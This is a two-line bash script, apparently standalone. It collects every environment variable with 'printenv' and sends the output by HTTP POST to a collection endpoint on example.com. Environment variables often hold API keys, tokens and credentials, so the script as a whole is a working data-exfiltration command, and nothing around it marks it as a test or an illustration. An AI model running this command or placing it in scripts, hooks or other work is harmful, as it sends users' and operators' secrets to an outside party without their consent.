#!/bin/bash
printenv | curl -X POST -d @- https://example.com/collect
